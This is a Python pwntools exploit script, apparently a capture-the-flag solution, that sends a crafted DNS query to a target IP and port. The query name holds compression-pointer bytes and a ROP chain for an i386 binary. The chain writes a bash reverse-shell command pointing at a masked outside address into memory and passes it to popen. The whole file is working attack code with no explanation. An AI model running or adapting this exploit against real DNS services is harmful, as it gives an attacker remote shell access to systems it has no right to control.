import socket
import os
import argparse
import random
import string
from pwn import *
context.arch='i386' #指定架构,不然会报错

#  无需connect服务端，因为发送时候跟上服务端ip和port就行
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

def genRandom(num, slen):
    unique_strings = []
    while len(unique_strings) < num:
        ustring = ''.join(random.choice(string.ascii_lowercase + string.ascii_lowercase + string.digits) for i in range(slen))
        if ustring not in unique_strings:
            unique_strings.append(ustring)
    return unique_strings

def dnsquery(ip, port):
    query = os.urandom(2)
    query += b'\x01\x00' # Flags: query + Truncated + Recursion Desired + Recursion Available
    query += b'\x00\x01' # Questions
    query += b'\x00\x00' # Answer RRs
    query += b'\x00\x00' # Authority RRs
    query += b'\x00\x00'# Additional RRs

    # Queries
    payload = b'\x3f' * 0x40
    for i in range(13):
        payload += b'\xc0'
        payload += bytes([0xe + i * 2])
    payload += b'\x3d'
    payload += b'\x41\x41\x41\x41\x41'

    popen_addr = 0x804ab40
    exit_addr = 0x804ad30
    nop_2e_addr = 0x0804A92E
    pop_eax_addr = 0x08059d44
    w_str_addr = 0x080A6660
    update_addr = 0x0804B2B1
    bss_addr = 0x80a7070

    shell = b'/bin/sh -i >& /dev/tcp/xx.xx.xxx.xxx/x 0>&1'.ljust(44, b'\x00')
    value = []
    for i in range(0, len(shell), 4):
        value.append(u32(shell[i:(i + 4)]))
    print(len(value))

    payload += flat([pop_eax_addr, bss_addr])
    for i in range(6):
        payload += flat([update_addr, value[i] ^ 0xffffffff])

    payload += b'\x3f'
    payload += b'\xa9\x04\x08'
    for i in range(6, 11):
        payload += flat([update_addr, value[i] ^ 0xffffffff])
    payload += flat([popen_addr, exit_addr, bss_addr + 0x4, w_str_addr])
    payload += b'\x41\x41\x41\x41'
    payload += b'\x00'
    print(payload)
    query += payload  # Name
    query += b'\x00\x01' # Type: NS
    query += b'\x00\x01'# Class: IN

    client.sendto(query, (ip, int(port)))
    data, server_addr = client.recvfrom(1024)
    print(data)

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-ip', help='ip address', required=True)
    parser.add_argument('-port', help='port', required=True)
    args = parser.parse_args()
    
    ip = args.ip
    port = args.port
    dnsquery(ip, port)


if __name__ == '__main__':
    main()